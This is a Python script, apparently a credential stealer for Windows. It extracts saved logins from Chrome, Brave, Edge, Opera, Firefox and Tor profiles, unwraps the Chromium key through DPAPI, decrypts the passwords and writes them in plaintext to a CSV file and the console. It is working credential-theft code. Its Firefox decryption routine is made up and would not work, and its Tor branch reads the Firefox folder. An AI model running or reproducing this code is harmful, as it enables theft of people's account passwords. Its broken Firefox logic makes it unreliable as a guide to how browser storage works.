import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv
import ctypes
import hashlib
import sqlite3
from Crypto.Cipher import AES
import time
from colorama import Fore, Back, Style, init
import random

# GLOBAL CONSTANTS for paths of various browsers
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
BRAVE_PATH = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % (os.environ['USERPROFILE']))
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']))
OPERA_PATH = os.path.normpath(r"%s\AppData\Local\Opera Software\Opera Stable" % (os.environ['USERPROFILE']))
FIREFOX_PATH = os.path.normpath(r"%s\AppData\Roaming\Mozilla\Firefox\Profiles" % (os.environ['USERPROFILE']))
TOR_PATH = os.path.normpath(r"%s\AppData\Roaming\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default" % (os.environ['USERPROFILE']))

# For Firefox password decryption
def get_firefox_passwords(profile_path):
    passwords = []
    try:
        # Firefox key file and logins
        key_file = os.path.join(profile_path, 'key4.db')
        logins_file = os.path.join(profile_path, 'logins.json')

        # Check if the Firefox files exist
        if not os.path.exists(key_file) or not os.path.exists(logins_file):
            return passwords

        # Read the Firefox logins
        with open(logins_file, 'r') as f:
            logins = json.load(f)['logins']

        # Read the encryption key
        conn = sqlite3.connect(key_file)
        cursor = conn.cursor()
        cursor.execute("SELECT item1, item2 FROM meta")
        key_data = cursor.fetchall()[0]
        cursor.close()
        conn.close()

        # Derive key for encryption
        password = key_data[0] + key_data[1]
        encryption_key = hashlib.sha256(password.encode('utf-8')).digest()

        # Decrypt passwords
        for login in logins:
            url = login['url']
            username = login['username']
            encrypted_password = base64.b64decode(login['encryptedPassword'])

            cipher = AES.new(encryption_key, AES.MODE_CBC, iv=encrypted_password[:16])
            decrypted_password = cipher.decrypt(encrypted_password[16:])
            decrypted_password = decrypted_password.decode('utf-8').strip()
            passwords.append((url, username, decrypted_password))

    except Exception as e:
        print(f"Error reading Firefox passwords: {e}")
    return passwords

def get_secret_key(browser):
    try:
        if browser == "chrome":
            local_state_path = os.path.join(CHROME_PATH, 'Local State')
        elif browser == "brave":
            local_state_path = os.path.join(BRAVE_PATH, 'Local State')
        elif browser == "edge":
            local_state_path = os.path.join(EDGE_PATH, 'Local State')
        elif browser == "opera":
            local_state_path = os.path.join(OPERA_PATH, 'Local State')

        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]  # Remove "DPAPI" prefix
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"[ERR] {browser} secretkey cannot be found: {str(e)}")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        # AES decryption
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)
        return decrypted_password.decode('utf-8')
    except Exception as e:
        print(f"[ERR] Decryption failed: {str(e)}")
        return ""

def get_db_connection(browser):
    try:
        if browser == "chrome":
            chrome_path_login_db = os.path.join(CHROME_PATH, 'Default', 'Login Data')
        elif browser == "brave":
            chrome_path_login_db = os.path.join(BRAVE_PATH, 'Default', 'Login Data')
        elif browser == "edge":
            chrome_path_login_db = os.path.join(EDGE_PATH, 'Default', 'Login Data')
        elif browser == "opera":
            chrome_path_login_db = os.path.join(OPERA_PATH, 'Login Data')

        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERR] Database for {browser} cannot be found: {str(e)}")
        return None

def main():
    try:
        # Get the current username
        current_user = os.getlogin()

        # Create DataFrame to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "browser", "url", "username", "password", "user"])  # Added "user" column

            # Iterate over browsers
            browsers = ["chrome", "brave", "edge", "opera", "firefox", "tor"]
            for browser in browsers:
                print(f"Processing {browser.capitalize()} passwords...")
                secret_key = get_secret_key(browser)
                if browser in ["chrome", "brave", "edge", "opera"]:
                    # For Chromium-based browsers
                    folders = [folder for folder in os.listdir(globals()[f"{browser.upper()}_PATH"]) if re.search("^Profile*|^Default$", folder)]
                    for folder in folders:
                        db_path = os.path.join(globals()[f"{browser.upper()}_PATH"], folder, "Login Data")
                        conn = get_db_connection(browser)
                        if secret_key and conn:
                            cursor = conn.cursor()
                            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                            for index, login in enumerate(cursor.fetchall()):
                                url = login[0]
                                username = login[1]
                                ciphertext = login[2]
                                if url and username and ciphertext:
                                    decrypted_password = decrypt_password(ciphertext, secret_key)
                                    print(f"Sequence: {index}")
                                    print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}")
                                    csv_writer.writerow([index, browser, url, username, decrypted_password, current_user])  # Added current_user
                            cursor.close()
                            conn.close()
                            os.remove("Loginvault.db")

                elif browser in ["firefox", "tor"]:
                    # For Firefox and Tor (both use Firefox's format)
                    profiles = os.listdir(FIREFOX_PATH)
                    for profile in profiles:
                        profile_path = os.path.join(FIREFOX_PATH, profile)
                        passwords = get_firefox_passwords(profile_path)
                        for index, (url, username, decrypted_password) in enumerate(passwords):
                            print(f"Sequence: {index}")
                            print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}")
                            csv_writer.writerow([index, browser, url, username, decrypted_password, current_user])  # Added current_user

    except Exception as e:
        print(f"[ERR] {str(e)}")

if __name__ == "__main__":
    main()
